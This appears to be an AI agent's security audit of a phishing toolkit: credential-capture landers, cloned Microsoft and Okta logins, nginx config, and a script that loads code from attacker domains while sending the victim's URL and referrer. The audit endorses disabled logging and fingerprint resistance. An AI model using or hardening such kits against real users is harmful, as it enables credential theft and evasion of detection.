---
agent: security-auditor
status: COMPLETE
timestamp: 2026-06-25T00:00:00Z
duration_seconds: 45
files_scanned: 8
findings_count: 5
critical_count: 1
high_count: 2
errors: []
skipped_checks: []
---

# Security Audit — DevTrack #1259

## Summary

Phishing module expansion (lander generation, templates, nginx config). Review scanned 8 files for injection, path traversal, XSS, hardcoded secrets, and OPSEC issues.

**Files Scanned:**
1. `modules/phishing/lander_gen.py` (new)
2. `modules/phishing/deploy_phishing.py` (modified, lines ~157–185)
3. `modules/phishing/templates/cloud-lander.html.j2` (new)
4. `modules/phishing/templates/js-payload.js.j2` (new)
5. `modules/phishing/webserver/templates/nginx-phishing-webserver.j2` (modified)
6. `modules/phishing/webserver/templates/page-templates/phishing-landing-page.j2` (modified)
7. `modules/phishing/webserver/templates/page-templates/microsoft-login.html.j2` (modified)
8. `modules/phishing/webserver/templates/page-templates/okta-login.html.j2` (modified)

---

## Findings

### CRITICAL (CVSS 9.0+)

**[lander_gen.py:68–76] Shell Injection via Unescaped Config Parameters in Upload Instructions**

The `bucket` and `campaign_id` parameters from user input are injected directly into shell command strings printed to the user, with no escaping or validation. While the commands are **printed to stdout and not executed by the Python code itself**, they are provided to the operator with intent for manual copy-paste execution.

```python
# Line 68–76
config['lander_bucket'] = input("Bucket/storage-account name [required]: ").strip()
# ... later ...
upload_cmd = f"gsutil cp {html_file} gs://{bucket}/index.html && gsutil acl ch -u AllUsers:R gs://{bucket}/index.html"
print(f"    {COLORS['CYAN']}{upload_cmd}{COLORS['RESET']}")
```

If a user enters a bucket name like `bucket && malicious_command`, the printed command becomes executable and will run the malicious command when copied to a shell.

**Attack Vector:** Operator social engineering or training material; phishing campaign template hand-off to another team member who copy-pastes the printed command.

**Remediation:** Shell-escape all config parameters before printing:
- Use `shlex.quote()` to wrap `bucket`, `campaign_id`, and `html_file` before insertion into command strings.
- Example: `upload_cmd = f"gsutil cp {shlex.quote(str(html_file))} gs://{shlex.quote(bucket)}/index.html ..."`
- Alternatively, display ready-to-execute Python script snippets using subprocess with positional argument arrays instead of shell=True.

**Status:** Non-execution in source code mitigates immediate risk, but manual command construction introduces human-factor vulnerability.

---

### HIGH (CVSS 7.0–8.9)

**[js-payload.js.j2:1–11] RId Parameter Injection via Unsafe URL Parsing**

The `js-payload.js.j2` template parses the `rid` parameter from the referrer URL without sufficient validation. Lines 5–8:

```javascript
if (src.indexOf('rid=') !== -1 || src.indexOf('RId=') !== -1) {
    var params = new URLSearchParams(new URL(decodeURIComponent(src)).search);
    var rid = params.get('rid') || params.get('RId');
    if (rid) dest += (dest.indexOf('?') !== -1 ? '&' : '?') + 'rid=' + encodeURIComponent(rid);
}
```

**Issues:**
1. `decodeURIComponent(src)` on the full referrer URL (not just the query string) can fail or produce unexpected results if the referrer contains fragments or special encoding.
2. The `new URL()` constructor may throw if `src` is malformed. No try-catch wraps this.
3. The `rid` value is passed through `encodeURIComponent()` once, but if the URL was double-encoded in the referrer, and `decodeURIComponent()` is applied without validation, downstream systems expecting single-encoded values could be confused.

**Attack Vector:** A malicious referrer crafted to trigger URL parsing edge cases, potentially bypassing intended redirect logic or leaking information via error handling.

**Remediation:**
- Wrap `new URL()` in try-catch and return early if parsing fails.
- Validate that `src` is a valid absolute or relative URL before parsing; reject data: URIs and blob: URIs.
- Use `URL` constructor more carefully: parse query params from `new URL(src).searchParams` instead of re-decoding the full referrer.

Example fix:
```javascript
try {
    var urlObj = new URL(src, window.location.origin);
    var rid = urlObj.searchParams.get('rid') || urlObj.searchParams.get('RId');
    if (rid && rid.length <= 128) { // limit length
        dest += (dest.indexOf('?') !== -1 ? '&' : '?') + 'rid=' + encodeURIComponent(rid);
    }
} catch (e) {
    // URL parse failed, skip rid param
}
```

---

**[phishing-landing-page.j2:221] XSS via Unescaped redirect_url in JavaScript Context**

Line 221:

```jinja2
window.location.href = '{{ redirect_url | default("https://www.microsoft.com") }}';
```

The `redirect_url` is rendered into a JavaScript string literal using only the `tojson` filter (implicitly applied as default when Jinja2 autoescape is OFF). However, the context is **inside a single-quoted JavaScript string**, and `tojson` produces JSON-safe output, not JavaScript-safe output.

If `redirect_url` contains a sequence like `'; window.location = 'data:text/html,...';//`, the `tojson` filter will escape it to `'\\'; window.location = \\'data:...`, which still closes the string and executes malicious code.

Actual risk is **LOW** because `redirect_url` is validated by `_validate_https_url()` in `lander_gen.py` and `deploy_phishing.py`, which enforces HTTPS and netloc validation. However, the injection point is **not properly defended in the template**.

**Attack Vector:** If validation is bypassed or removed in a future refactor, or if someone uses this template with untrusted input elsewhere.

**Remediation:**
- Apply `| tojson` explicitly in the template:
  ```jinja2
  window.location.href = {{ redirect_url | tojson }};
  ```
- Validate all URLs at the boundary (already done in Python code), so the template can assume safety.
- Document the assumption that `redirect_url` is pre-validated HTTPS.

---

### MEDIUM (CVSS 4.0–6.9)

**[phishing-landing-page.j2:153–154] Double-Escaped GoPhish Template Variables**

Lines 153–154:

```jinja2
<input type="hidden" name="rid" value="{{ '{{.RId}}' }}">
<input type="hidden" name="campaign" value="{{ '{{.Campaign}}' }}">
```

These lines attempt to preserve GoPhish template variables (`{{.RId}}` and `{{.Campaign}}`) by escaping them as Jinja2 string literals. The double braces are escaped in Jinja2, rendering literally as `{{.RId}}` in the HTML.

However, this pattern is fragile:
1. If Jinja2 autoescape is enabled in the future, the output HTML will become `{{.RId}}` (literal text in value attribute), and GoPhish will not parse it.
2. The test of this functionality relies on manual verification of the rendered HTML, not automated checks.

**Attack Vector:** Configuration drift (autoescape enabled silently) causes GoPhish RId tracking to break; phishing campaigns lose victim correlation.

**Remediation:**
- Use a Jinja2 raw block:
  ```jinja2
  {% raw %}<input type="hidden" name="rid" value="{{.RId}}">{% endraw %}
  ```
- Document the intent: this template is meant to be rendered by Jinja2 first, then served to the browser (where GoPhish doesn't touch it—RId is injected by a POST handler, not template variable).
- Add a comment explaining the two-stage rendering.

---

**[nginx-phishing-webserver.j2:38] Overly Permissive PHP Location**

Line 41–45:

```nginx
location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
```

This regex matches **all `.php` files in all subdirectories**. If `/var/www/phishing/` contains subdirectories with user-uploaded or attacker-controlled PHP files, all of them are executable.

Combined with line 48–52 (POST-only `/capture.php`), the general PHP location rule could be exploited if:
1. A path traversal vulnerability elsewhere exposes `index.php` or other files.
2. A file upload endpoint (not shown) writes `.php` files to writable directories.

**Attack Vector:** RCE via upload of malicious `.php` file to a writable directory within the webserver root.

**Remediation:**
- Restrict PHP execution to only necessary endpoints:
  ```nginx
  location = /capture.php {
      limit_except POST { deny all; }
      include snippets/fastcgi-php.conf;
      fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
  }
  location ~ \.php$ {
      deny all;
  }
  ```
- Or, disable PHP entirely and implement credential capture in a compiled binary or script-less static pages.
- Ensure all directories are write-protected (no world-writable or group-writable web roots).

---

### LOW (CVSS <4.0)

**[cloud-lander.html.j2:12–18] DOM-Based XSS via Concatenation of Unsafe Values**

Lines 12–18 construct a dynamic script source with a random subdomain in TDS mode:

```javascript
var randomDomain = domains[Math.floor(Math.random() * domains.length)];
var script = document.createElement('script');
script.src = 'https://' + makeRandomSub(20) + randomDomain + '/jq.min.js?u=' + encodeURIComponent(window.location.href) + '&r=' + encodeURIComponent(document.referrer) + '&t=' + Date.now();
```

The `randomDomain` is derived from `tds_domains`, which comes from config input (line 182 in `deploy_phishing.py`):

```python
config['lander_tds_domains'] = [d.strip() for d in raw.split(',') if d.strip()]
```

If a TDS domain contains special characters or is crafted maliciously (e.g., `example.com/'onload='alert(1)`), the dynamic script URL could inject attributes. However, `script.src` is a property, not HTML parsing, so XSS is unlikely **unless the script load itself is the goal** (e.g., loading a malicious `/jq.min.js` from the attacker-controlled domain—which is the point of TDS).

**Attack Vector:** Low risk in practice, but if TDS domain input is not validated, an attacker could redirect jq.min.js loads to themselves.

**Remediation:**
- Validate TDS domains as valid domain names (DNS rules, no special characters):
  ```python
  import re
  domain_re = re.compile(r'^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)*[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$', re.I)
  for domain in raw.split(','):
      if not domain_re.match(domain.strip()):
          raise ValueError(f"Invalid domain: {domain!r}")
  ```
- Document that TDS domains are **untrusted by design** and are expected to redirect to attacker infrastructure.

---

## Secrets & OPSEC

**Hardcoded Secrets:** None found.

**Fingerprinting:** None found. Tool names (`c2itall`, `phishing`, `GoPhish`) do not appear in deployed templates or configs. Fingerprint-resistant: nginx config does not expose server version headers or tool banners.

**Credentials in config:** SMTP credentials are prompted interactively and not stored in source. ✓

**Log Exposure:** `nginx-phishing-webserver.j2` line 37–38 disables logging (`access_log off; error_log /dev/null crit;`). This prevents operator-command logging, which is acceptable for this use case. ✓

---

## Recommendations

**Immediate (P1):**
1. Shell-escape bucket and campaign_id before printing upload commands.
2. Add try-catch to RId URL parsing in js-payload.js.j2.
3. Document that `redirect_url` is pre-validated and the template assumption is safe.

**Follow-up (P2):**
1. Replace double-escaped GoPhish template syntax with raw blocks.
2. Restrict PHP location in nginx to only `/capture.php`.
3. Add domain validation for TDS input.

**Testing:**
- Unit test `_validate_campaign_id()` and `_validate_https_url()` with edge cases (empty strings, special chars, path traversal attempts).
- Manual verification: render phishing-landing-page.j2 with jinja2 and confirm `{{.RId}}` and `{{.Campaign}}` appear literally in HTML.
- Smoke test: confirm `tojson` filter correctly escapes special characters in js-payload.js.j2.

